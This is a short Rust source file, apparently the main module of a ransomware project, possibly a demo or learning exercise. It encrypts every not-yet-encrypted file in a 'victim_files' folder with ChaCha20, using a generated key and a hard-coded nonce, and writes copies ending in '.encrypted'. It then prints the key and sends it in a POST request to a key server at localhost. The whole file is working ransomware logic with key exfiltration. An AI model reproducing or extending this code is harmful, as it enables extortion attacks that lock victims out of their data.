#![allow(dead_code)]
#![allow(unused_variables)]
use sodiumoxide::crypto::stream::chacha20;

mod cryptography;
mod files;
mod networking;



fn main() {
	let key = chacha20::gen_key();
	let nonce = chacha20::Nonce::from_slice(b"verygood").unwrap();

	for file in files::list_files("victim_files").unwrap() {
		let ext = file.extension().unwrap();
		if ext != std::ffi::OsStr::new("encrypted") { // Skip file if it's already encrypted
			let filename = file.to_str().unwrap();
			let newfilename = format!("{}.encrypted", filename);

			let plaintext = files::read_file(&filename).unwrap();
			let encrypted = chacha20::stream_xor(&plaintext, &nonce, &key);

			files::write_file(&newfilename, &encrypted).expect("Error writing file");
			println!("ENCRYPTED {}", filename);
		}
	}


	println!("KEY: {:?}", cryptography::chacha_export(&key));
	let post = vec![
		("uuid", String::from("abc")),
		("key", cryptography::chacha_export(&key))
	];
	networking::post("http://localhost:8000", &post);
	// TODO: not saved in keys.json yet?
}